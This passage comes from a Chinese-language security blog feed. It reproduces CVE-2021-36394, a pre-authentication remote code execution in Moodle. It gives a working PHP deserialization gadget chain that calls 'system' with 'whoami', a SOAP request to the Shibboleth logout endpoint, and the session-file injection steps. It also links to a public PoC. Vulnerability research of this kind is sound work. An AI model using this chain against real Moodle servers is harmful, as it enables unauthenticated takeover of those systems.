class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">core</span>\<span class="hljs-title class_">lock</span> &#123;<br>    <span class="hljs-title class_">class</span> <span class="hljs-title class_">lock</span> &#123;<br>        <span class="hljs-title class_">public</span> <span class="hljs-title class_">function</span> <span class="hljs-title class_">__construct</span>($<span class="hljs-title class_">class</span>)<br>        &#123;<br>            $<span class="hljs-title class_">this</span>-&gt;<span class="hljs-title class_">key</span> = $<span class="hljs-title class_">class</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">core_availability</span>&#123;<br>    <span class="hljs-title class_">class</span> <span class="hljs-title class_">tree</span> &#123;<br>        <span class="hljs-title class_">public</span> <span class="hljs-title class_">function</span> <span class="hljs-title class_">__construct</span>($<span class="hljs-title class_">class</span>)<br>        &#123;<br>            $<span class="hljs-title class_">this</span>-&gt;<span class="hljs-title class_">children</span> = $<span class="hljs-title class_">class</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">core</span>\<span class="hljs-title class_">dml</span>&#123;<br>    <span class="hljs-title class_">class</span> <span class="hljs-title class_">recordset_walk</span> &#123;<br>        <span class="hljs-title class_">public</span> <span class="hljs-title class_">function</span> <span class="hljs-title class_">__construct</span>($<span class="hljs-title class_">class</span>)<br>        &#123;<br>            $<span class="hljs-title class_">this</span>-&gt;<span class="hljs-title class_">recordset</span> = $<span class="hljs-title class_">class</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;callbackextra = <span class="hljs-literal">null</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;callback = <span class="hljs-string">&quot;system&quot;</span>;<br><br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> &#123;<br><br>    <span class="hljs-title class_">class</span> <span class="hljs-title class_">question_attempt_iterator</span>&#123;<br>        <span class="hljs-title class_">public</span> <span class="hljs-title class_">function</span> <span class="hljs-title class_">__construct</span>($<span class="hljs-title class_">class</span>)<br>        &#123;<br>            $<span class="hljs-title class_">this</span>-&gt;<span class="hljs-title class_">slots</span> = <span class="hljs-title class_">array</span>(<br>                &quot;<span class="hljs-title class_">xxx</span>&quot; =&gt; &quot;<span class="hljs-title class_">key</span>&quot;<br>            );<br>            <span class="hljs-variable language_">$this</span>-&gt;quba = <span class="hljs-variable">$class</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">question_usage_by_activity</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;questionattempts = <span class="hljs-keyword">array</span>(<br>                <span class="hljs-string">&quot;key&quot;</span> =&gt; <span class="hljs-string">&quot;whoami&quot;</span><br>            );<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">core_question_external</span></span>&#123;<br><br>    &#125;<br><br>    <span class="hljs-variable">$add_lib</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">core_question_external</span>();<br>    <span class="hljs-variable">$activity</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">question_usage_by_activity</span>();<br>    <span class="hljs-variable">$iterator</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">question_attempt_iterator</span>(<span class="hljs-variable">$activity</span>);<br>    <span class="hljs-variable">$walk</span> = <span class="hljs-keyword">new</span> core\dml\<span class="hljs-title function_ invoke__">recordset_walk</span>(<span class="hljs-variable">$iterator</span>);<br>    <span class="hljs-variable">$tree</span> = <span class="hljs-keyword">new</span> core_availability\<span class="hljs-title function_ invoke__">tree</span>(<span class="hljs-variable">$walk</span>);<br>    <span class="hljs-variable">$lock</span> = <span class="hljs-keyword">new</span> core\lock\<span class="hljs-title function_ invoke__">lock</span>(<span class="hljs-variable">$tree</span>);<br><br>    <span class="hljs-variable">$arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-variable">$add_lib</span>, <span class="hljs-variable">$lock</span>);<br>    <br>    <span class="hljs-variable">$value</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$arr</span>);<br><br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$value</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="session-文件写入"><a href="#session-文件写入" class="headerlink" title="session 文件写入"></a>session 文件写入</h3><p>接下来我们要想办法将反序列化后的内容写入 <code>session</code> 文件</p><p>来到文件 <code>grade/report/grader/index.php</code> ，这是我们可以直接访问到的文件，来看看有什么处理</p><p><img src="202210262316088.png" alt="202210262316088.png"></p><p><code>required_param</code> 与 <code>option_param</code> 差不多，一个是必须，一个是可选，都是获取参数，这里可以看到 <code>id</code> 是必须的，且为 <code>int</code> 类型，其他的都是可选的，继续看下面的</p><p><img src="202210262316384.png" alt="202210262318380.png"></p><p>可以看到，<code>$graderreportsifirst</code> 与 <code>$graderreportsilast</code> 被写入了 <code>$SESSION</code> ，也就是上面的 <code>sifirst</code> 和 <code>silast</code>，而 <code>$SESSION</code> 是 <code>global</code> 修饰的，指向 <code>$GLOBALS[&#39;SESSION&#39;]</code> ，在 <code>lib/classes/session/manager.php</code> 中赋值</p><p><img src="202210262316167.png" alt="202210262318380.png"></p><p>默认 <code>session</code> 会存储在文件中，因此我们的反序列化 <code>payload</code> 就会被写入 <code>session</code> 的文件存储起来，但是存储进 <code>session</code> 文件的 <code>payload</code> 如何被成功反序列化呢？这就看最关键的下一部分</p><h3 id="反序列化执行入口"><a href="#反序列化执行入口" class="headerlink" title="反序列化执行入口"></a>反序列化执行入口</h3><p>反序列化执行的入口出在 <code>Shibboleth</code> 认证模块，需要管理者开启该认证模块才可以使用，默认是不开启的，因此降低了此漏洞的影响面，但全网存在的 <code>moodle</code> 系统实在是多，所以影响还是可以的。</p><p>来到 <code>auth/shibboleth/logout.php</code></p><p><img src="202210262317875.png" alt="202210262318380.png"></p><p>首先是获取了输入流赋值给 <code>$inputstream</code> ，当 <code>$inputstream</code> 不为空时，会使用 <code>soap</code> 来处理，<code>$server-&gt;handle()</code> 默认处理输入流中的数据， 构造如下 <code>xml</code> 数据流访问就可以访问到 <code>LogoutNotification</code> 函数</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">soap:Envelope</span> <span class="hljs-attr">xmlns:soap</span>=<span class="hljs-string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">soap:Body</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">LogoutNotification</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">spsessionid</span>&gt;</span>xxxx<span class="hljs-tag">&lt;/<span class="hljs-name">spsessionid</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">LogoutNotification</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">soap:Body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">soap:Envelope</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="202210262318745.png" alt="202210262318380.png"></p><p>这里会先获取 <code>session</code> 存储的方式，文件存储与数据库存储，默认为文件存储，这时会进入 <code>\auth_shibboleth\helper::logout_file_session($spsessionid);</code></p><p><img src="202210262318274.png" alt="202210262318380.png"></p><p>这里获取了 <code>session</code> 存储的位置，然后遍历所有文件，获取内容，最后进入 <code>self::unserializesession($data[0]);</code></p><p><img src="202210262318380.png" alt="202210262318380.png"></p><p>这里首先以 <code>|</code> 分割字符串，然后以2个为一组，将每组的第二个反序列化，这里就解决了第二部分的问题，可以构造包含 <code>|</code> 与 <code>payload</code> 的字符串，就可以成功反序列化 <code>payload</code> ，构造如下</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lasso">aaaaaa|<span class="hljs-params">...</span><span class="hljs-params">...</span>payload<span class="hljs-params">...</span><span class="hljs-params">...</span>|bbbbbb<br></code></pre></td></tr></table></figure><h2 id="0x04-漏洞复现"><a href="#0x04-漏洞复现" class="headerlink" title="0x04 漏洞复现"></a>0x04 漏洞复现</h2><p>复现 <code>POC</code> 已上传 <code>github</code> <a href="https://github.com/N0puple/vulPOC/tree/main/Moodle/CVE-2021-36394%20Pre-Auth%20RCE%20in%20Moodle">传送门</a> ，需要注意的是，这个命令执行是无回显的，这里借助 <code>ceye</code> 平台进行测试</p><p>使用 <code>docker-compose.yml</code> 搭建环境</p><p>使用 <code>moodle_unserialize_rce.php</code> 生成反序列化字符串</p><p><img src="202210262318746.png" alt="image-20211017175905534.png"></p><p>使用 <code>moodle_rce.py</code> 进行测试</p><p><img src="202210262318747.png" alt="image-20211017180115851.png"></p><p>查看 <code>ceye</code> 平台</p><p><img src="202210262318748.png" alt="image-20211017180256269.png"></p><h2 id="0x05-参考链接"><a href="#0x05-参考链接" class="headerlink" title="0x05 参考链接"></a>0x05 参考链接</h2><ul><li><a href="https://haxolot.com/posts/2021/moodle_pre_auth_shibboleth_rce_part1/">https://haxolot.com/posts/2021/moodle_pre_auth_shibboleth_rce_part1&#x2F;</a></li><li><a href="https://github.com/dinhbaouit/CVE-2021-36394">https://github.com/dinhbaouit/CVE-2021-36394</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;本文首发于先知社区：&lt;a href=&quot;https://xz.aliyun.com/t/10383&quot;&gt;https://xz.aliyun.com/t/10383&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;本文仅用于技术讨论与研究，文中的实现方法切勿应用在任何违法场景。如因涉嫌违法造成的一切不良影</summary>
      
    
    
    
    <category term="PHP漏洞复现" scheme="https://n0puple.github.io/categories/PHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="PHP" scheme="https://n0puple.github.io/tags/PHP/"/>
    
    <category term="RCE" scheme="https://n0puple.github.io/tags/RCE/"/>
    
    <category term="CVE" scheme="https://n0puple.github.io/tags/CVE/"/>
    
    <category term="漏洞复现" scheme="https://n0puple.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    <category term="Moodle" scheme="https://n0puple.github.io/tags/Moodle/"/>
    
    <category term="未授权访问" scheme="https://n0puple.github.io/tags/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"/>
    
    <category term="PHP反序列化" scheme="https://n0puple.github.io/tags/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
</feed>
